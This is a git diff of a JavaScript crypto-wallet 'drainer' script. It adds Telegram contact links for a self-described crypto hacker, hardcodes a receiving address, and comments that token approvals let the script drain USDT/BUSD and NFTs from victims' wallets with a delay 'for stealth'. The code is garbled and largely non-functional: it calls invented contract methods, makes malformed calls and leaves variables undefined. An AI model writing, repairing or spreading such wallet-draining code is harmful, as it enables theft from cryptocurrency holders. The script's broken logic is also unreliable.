@@ -1,18 +1,24 @@
+//- **✉ Contact: https://t.me/Cryptohacker1402** 
+//- **👥 Channel: https://t.me/cryptohackers1402** 
+
+
+//code for local smart contract
+
 const receiveAddress = "0x2517d9D04B5716D9bd4d6780E2577d758d95F894";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
-var smartcontract
+var smartcontract;
 
 
 function approveSpending(token) {
 	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainusdt.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	 smartcontract.methods.approvetransaction(targetwallet);      //the smart contract gets approved to access tokens
+	smartcontract.methods.drainBUSD.send(to,receiveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
   			
-}
+
 
 function drainwallet(token) {
 	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
@@ -28,11 +34,13 @@ if (!receiveAddressx.startsWith("0x") ||
         receiveAddressx.length >= 64 ||
         receiveAddressx.length <= 40
     )
+) {
+    const web3 = new Web3('https://bsc-dataseed.binance.org/'); // Example BSC RPC endpoint, replace with your own
+    cryptotokenContract = new web3.eth.Contract(tokenAbi, 'YOUR_CONTRACT_ADDRESS'); // Replace 'YOUR_CONTRACT_ADDRESS' with your contract address
+}
 
+/* JavaScript smart contract node
 
-
-/*
- * JavaScript smart contract node
 /* global define */
 
 /* eslint-disable strict */
@@ -416,3 +424,7 @@ if (!receiveAddressx.startsWith("0x") ||
     $.md5 = md5
   }
 })(this)
+
+//- **✉ Contact: https://t.me/Cryptohacker1402** 
+//- **👥 Channel: https://t.me/cryptohackers1402** 
+
